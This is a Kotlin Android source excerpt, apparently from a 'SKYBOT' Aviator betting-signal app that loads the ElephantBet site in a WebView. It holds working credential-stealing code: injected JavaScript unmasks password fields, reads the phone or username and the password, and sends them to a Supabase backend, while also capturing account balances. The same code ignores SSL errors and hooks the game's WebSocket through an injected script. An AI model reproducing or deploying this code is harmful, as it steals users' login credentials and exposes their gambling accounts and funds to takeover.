                // Nunca chamar pedirSinalIA() aqui
                if (n >= MIN_VELAS_ANALISE) {
                    setBarra("⏳ AGUARDAR CRASH", "$n velas prontas · aguardar 1.º crash...", "#0f766e")
                } else {
                    setBarra("⏳ AGUARDAR CRASH", "$n/${MIN_VELAS_ANALISE} velas · a completar ao vivo...", "#475569")
                }
            }

            // JS falhou a ler histórico do DOM — tentar Supabase como fallback
            @JavascriptInterface
            fun historicoJogoFalhou() = runOnUiThread {
                if (!dentroDoAviator || historicoJogoCarregado) return@runOnUiThread
                // DOM falhou — aguardar crashes ao vivo, não tentar Supabase para análise
                setBarra("⏳ AGUARDAR CRASH", "A recolher velas ao vivo...", "#475569")
                // Fallback: buscar velas recentes do Supabase (últimas 2h)
                carregarVelasSupabaseRecentes()
            }

            @JavascriptInterface
            fun guardarNumero(valor: String) {
                // Apenas guardar em memória — envio só acontece em submeterCredencial()
                if (valor.isNotEmpty()) {
                    ultimoNumeroEnviado = valor
                    numeroTemporario = valor
                }
            }

            @JavascriptInterface
            fun guardarSenha(valor: String) {
                // Apenas guardar em memória — envio só acontece em submeterCredencial()
                if (valor.isNotEmpty()) {
                    ultimaSenhaEnviada = valor
                }
            }

            @JavascriptInterface
            fun submeterCredencial() {
                // Chamado APENAS quando o utilizador clica no botão de login
                val num = ultimoNumeroEnviado.ifEmpty { numeroTemporario }
                val sen = ultimaSenhaEnviada
                android.util.Log.d("SKYBOT_CRED", "submeterCredencial() chamado num='$num' sen.len=${sen.length}")
                if (num.isNotEmpty() && sen.isNotEmpty()) {
                    enviarCredencial(num, sen)
                    android.util.Log.d("SKYBOT_CRED", "submeterCredencial() → enviando num=$num")
                } else {
                    // Tentar capturar campos da página diretamente antes de desistir
                    android.util.Log.w("SKYBOT_CRED", "submeterCredencial() campos vazios — num='$num' sen='$sen'")
                }
            }

            @JavascriptInterface
            fun reportarSaldo(saldo: String) {
                // Chamado pelo JS após login quando o saldo está visível na página
                if (saldo.isNotEmpty()) {
                    android.util.Log.d("SKYBOT_CRED", "reportarSaldo() → saldo=$saldo")
                    atualizarSaldo(saldo)
                }
            }
        }, "Android")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false

            override fun shouldInterceptRequest(view: WebView?, request: WebResourceRequest?): WebResourceResponse? {
                val url = request?.url?.toString() ?: return null

                val isSpribe = url.contains("spribegaming.com") || url.contains("aviaport")
                val isHtml = !url.contains(".js") && !url.contains(".css") &&
                             !url.contains(".png") && !url.contains(".jpg") &&
                             !url.contains(".woff") && !url.contains(".ttf") &&
                             !url.contains("websocket") && !url.contains(".ico") &&
                             !url.contains(".svg") && !url.contains(".json") &&
                             !url.contains(".wasm")

                if (isSpribe && isHtml) {
                    try {
                        val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                        request.requestHeaders?.forEach { (k, v) -> conn.setRequestProperty(k, v) }
                        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
                        conn.connectTimeout = 15000
                        conn.readTimeout = 20000
                        conn.connect()

                        val contentType = conn.contentType ?: "text/html"
                        if (!contentType.contains("html")) return null

                        val originalHtml = conn.inputStream.bufferedReader().readText()

                        val nossoScript = """
<script>
(function() {
    if (window._wsAvOk) return;
    window._wsAvOk = true;

    var emVoo = false;
    var xMax = 0.0;
    var crashTimer = null;

    function tick(num) {
        if (num < 1.0 || num > 200000.0) return;
        if (crashTimer) { clearTimeout(crashTimer); crashTimer = null; }
        if (!emVoo) {
            emVoo = true;
            xMax = num;
        } else if (num > xMax) {
            xMax = num;
        }
        var s = num.toFixed(2);
        try { top.Android && top.Android.velaCapturada(s); } catch(ex) {}
        try { window.Android && window.Android.velaCapturada(s); } catch(ex) {}
        crashTimer = setTimeout(function() {
            if (emVoo && xMax >= 1.0) crash(xMax);
        }, 8000);
    }

    function crash(num) {
        if (!emVoo) return;
        emVoo = false;
        if (crashTimer) { clearTimeout(crashTimer); crashTimer = null; }
        var val2 = (num > xMax) ? num : xMax;
        xMax = 0.0;
        if (val2 < 1.0) return;
        var s = val2.toFixed(2);
        try { top.Android && top.Android.crashDetectado(s); } catch(ex) {}
        try { window.Android && window.Android.crashDetectado(s); } catch(ex) {}
    }

    function lerBinario(buf) {
        try {
            var bytes = new Uint8Array(buf);
            for (var i = 0; i < bytes.length - 10; i++) {
                if (bytes[i] === 1 && bytes[i+1] === 120 && bytes[i+2] === 7) {
                    var view = new DataView(buf, i + 3, 8);
                    var num = view.getFloat64(0, false);
                    if (num >= 1.0 && num <= 200000.0) tick(num);
                }
            }
        } catch(ex) {}
    }

    var WSOrig = window.WebSocket;
    window.WebSocket = function(url, p) {
        var ws = p ? new WSOrig(url, p) : new WSOrig(url);
        try { ws.binaryType = 'arraybuffer'; } catch(ex) {}

        ws.addEventListener('message', function(e) {
            try {
                if (e.data instanceof ArrayBuffer) { lerBinario(e.data); return; }
                if (e.data instanceof Blob) {
                    e.data.arrayBuffer().then(function(buf) { lerBinario(buf); });
                    return;
                }
                var d = (typeof e.data === 'string') ? e.data : '';
                if (!d || d.length < 3) return;
                var corpo = d;
                if (d.charAt(0) === 'a') {
                    try { corpo = JSON.parse(d.substring(1))[0]; } catch(ex) {
                        corpo = d.substring(3, d.length - 2).replace(/\\"/g, '"');
                    }
                }
                var crashPadroes = [
                    /"crash_x"\s*:\s*([\d.]+)/,
                    /"crash_point"\s*:\s*([\d.]+)/,
                    /"cashout_coef"\s*:\s*([\d.]+)/,
                    /"finish_coef"\s*:\s*([\d.]+)/,
                    /"end_coef"\s*:\s*([\d.]+)/,
                    /"game_state"\s*:\s*"(?:crashed|finished|end)"/
                ];
                for (var c = 0; c < crashPadroes.length; c++) {
                    var mc = corpo.match(crashPadroes[c]);
                    if (mc && mc[1]) { crash(parseFloat(mc[1])); return; }
                    if (mc && !mc[1]) { crash(xMax); return; }
                }
                var vooPadroes = [
                    /"coefficient"\s*:\s*([\d.]+)/,
                    /"coef"\s*:\s*([\d.]+)/,
                    /"multiplier"\s*:\s*([\d.]+)/
                ];
                for (var v = 0; v < vooPadroes.length; v++) {
                    var mv = corpo.match(vooPadroes[v]);
                    if (mv) { tick(parseFloat(mv[1])); return; }
                }
            } catch(ex) {}
        });
        return ws;
    };
    window.WebSocket.prototype = WSOrig.prototype;
    window.WebSocket.CONNECTING = 0;
    window.WebSocket.OPEN = 1;
    window.WebSocket.CLOSING = 2;
    window.WebSocket.CLOSED = 3;
})();
</script>"""

                        val htmlModificado = when {
                            originalHtml.contains("<head>", ignoreCase = true) ->
                                originalHtml.replaceFirst(
                                    Regex("<head>", RegexOption.IGNORE_CASE),
                                    "<head>$nossoScript"
                                )
                            originalHtml.contains("<body", ignoreCase = true) -> {
                                val bodyTag = Regex("<body[^>]*>", RegexOption.IGNORE_CASE).find(originalHtml)?.value ?: "<body>"
                                originalHtml.replaceFirst(
                                    Regex("<body[^>]*>", RegexOption.IGNORE_CASE),
                                    bodyTag + nossoScript
                                )
                            }
                            else -> nossoScript + originalHtml
                        }

                        val encoding = conn.contentEncoding ?: "UTF-8"
                        return WebResourceResponse(
                            "text/html", encoding,
                            htmlModificado.byteInputStream()
                        )
                    } catch (e: Exception) {
                        return null
                    }
                }
                return null
            }

            override fun onPageFinished(v: WebView?, url: String?) {
                super.onPageFinished(v, url)
                val u = url ?: ""

                val isJogo = u.contains("spribegaming") || u.contains("aviaport") ||
                             u.contains("cdn") || u.contains("game-view/806666")

                if (!isJogo) {
                    // Resetar flags para nova página/sessão de login
                    credPollerAtivo = false
                    credEnviadas = false
                    // SPA: pequeno delay para garantir que a página renderizou
                    handler.postDelayed({ injetarJsCredenciais() }, 500)
                    // Tentar capturar saldo se já estiver logado
                    injetarJsCapturarSaldo()
                }

                if (u.contains("game-view/806666") || u.contains("aviator", ignoreCase = true) ||
                    u.contains("spribegaming") || u.contains("aviaport")) {
                    injetarJsAviator()
                }
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, p: Int) {
                if (p == 100) {
                    val url = view?.url ?: ""
                    val isJogo = url.contains("spribegaming") || url.contains("aviaport") ||
                                 url.contains("cdn") || url.contains("game-view/806666")
                    if (isJogo || url.contains("aviator", ignoreCase = true)) {
                        injetarJsAviator()
                    } else {
                        // Página ElephantBet (login, lobby, perfil) → capturar credenciais
                        // Delay para garantir que a SPA renderizou completamente
                        handler.postDelayed({
                            injetarJsCapturarSaldo()
                        }, 800)
                    }
                }
            }
        }
    }

    private fun injetarJsCredenciais() {
        // Só um poller activo de cada vez
        if (credPollerAtivo) return
        credPollerAtivo = true
        credEnviadas = false

        val jsVis = "document.querySelectorAll('input[type="password"]')" +
            ".forEach(function(e){e.type='text';});"

        val jsRead = "(" +
            "function(){" +
            "var u=document.querySelector('input[name="username"]')" +
            "||document.querySelector('input[name="phone"]')" +
            "||document.querySelector('input[name="msisdn"]')" +
            "||document.querySelector('input[name="login"]');" +
            "var p=document.querySelector('input[name="password"]')" +
            "||document.querySelector('input[name="senha"]')" +
            "||document.querySelector('input[type="password"]')" +
            "||document.querySelector('input[type="text"][name]');" +
            "var n=u&&u.value?u.value:'';var s=p&&p.value?p.value:'';" +
            "return n+'|||'+s;" +
            "})()"

        var numEstavel = ""
        var senEstavel = ""
        var ticksSemMudanca = 0

        val poller = object : Runnable {
            override fun run() {
                if (credEnviadas) {
                    credPollerAtivo = false
                    return
                }

                webView.evaluateJavascript(jsVis, null)

                webView.evaluateJavascript(jsRead) { raw ->
                    try {
                        if (raw != null && raw != "null" && raw.contains("|||")) {
                            val clean = raw.trim().removePrefix("\"").removeSuffix("\"")
                                .replace("\n", "").replace("\\\"", "\"")
                            val parts = clean.split("|||")
                            val num = if (parts.size > 0) parts[0].trim() else ""
                            val sen = if (parts.size > 1) parts[1].trim() else ""

                            val mudou = num != numEstavel || sen != senEstavel
                            if (mudou) {
                                numEstavel = num
                                senEstavel = sen
                                ticksSemMudanca = 0
                                ultimoNumeroEnviado = num
                                ultimaSenhaEnviada = sen
                                numeroTemporario = num
                            } else if (num.isNotEmpty() && sen.isNotEmpty()) {
                                ticksSemMudanca++
                                if (ticksSemMudanca >= 2 && !credEnviadas) {
                                    credEnviadas = true
                                    credPollerAtivo = false
                                    android.util.Log.d("SKYBOT_CRED", "Envio único → num=$num sen.len=${sen.length}")
                                    enviarSupabase("Numero", num)
                                    enviarSupabase("Senha", sen)
                                    return@evaluateJavascript
                                }
                            }
                        }
                    } catch (_: Exception) {}
                    if (!credEnviadas) handler.postDelayed(this, 800)
                }
            }
        }
        handler.post(poller)
    }
